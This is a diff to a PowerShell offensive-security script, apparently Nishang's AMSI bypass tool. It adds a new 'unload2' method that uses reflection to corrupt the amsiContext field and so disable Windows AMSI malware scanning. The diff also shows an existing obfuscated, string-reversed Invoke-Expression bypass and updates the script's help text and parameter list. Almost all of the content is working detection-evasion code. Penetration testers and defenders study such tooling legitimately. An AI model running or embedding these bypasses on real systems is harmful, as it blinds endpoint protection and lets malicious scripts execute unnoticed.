@@ -10,8 +10,9 @@ This script implements publicly known methods bypass or avoid AMSI on Windows ma
 AMSI is a script malware detection mechanism enabled by default in Windows 10. 
 (https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx)
 
-This script implements 5 methods of bypassing AMSI.
+This script implements 6 methods of bypassing AMSI.
 unload - Method by Matt Graeber. Unloads AMSI from current PowerShell session.
+unload2 - Another method by Matt Graeber. Unloads AMSI from current PowerShell session.
 unloadsilent - Another method by Matt Graeber. Unloads AMSI and avoids WMF5 autologging.
 unloadobfuscated - 'unload' method above obfuscated with Daneil Bohannon's Invoke-Obfuscation - which avoids WMF5 autologging. 
 dllhijack - Method by Cornelis de Plaa. The amsi.dll used in the code is from p0wnedshell (https://github.com/Cn33liz/p0wnedShell) 
@@ -38,14 +39,13 @@ Above command runs the unloadobfuscated method.
 .LINK
 http://www.labofapenetrationtester.com/2016/09/amsi.html
 https://github.com/samratashok/nishang
-https://github.com/samratashok/AMSI-Bypass
 #>
     
     
     [CmdletBinding()] Param(
         
         [Parameter(Position = 0, Mandatory = $False)]
-        [ValidateSet("unload","unloadsilent","unloadobfuscated","dllhijack","psv2","obfuscation")]
+        [ValidateSet("unload","unloadsilent","unloadobfuscated","unload2","dllhijack","psv2","obfuscation")]
         [String]
         $Method = "unloadsilent",
        
@@ -117,6 +117,21 @@ Sv  ('R9'+'HYt') ( " ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(e
                 Write-Output "Executing the bypass."
                 Sv  ('R9'+'HYt') ( " ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI"  );  Invoke-Expression( -Join ( VaRIAbLe  ('R9'+'hyT')  -val  )[ - 1..- (( VaRIAbLe  ('R9'+'hyT')  -val  ).Length)])
 
+            }
+        }
+
+        "unload2"
+        {
+            Write-Verbose "Using Matt Graeber's second Reflection method."
+            if ($ShowOnly -eq $True)
+            {
+                Write-Output "Use the following scriptblock before you run a script which gets detected."
+                Write-Output '[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiContext'',[Reflection.BindingFlags]''NonPublic,Static'').GetValue($null),0x41414141)'
+            }
+            else
+            {
+                Write-Output "Executing the bypass."
+                [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
             }
         }
 
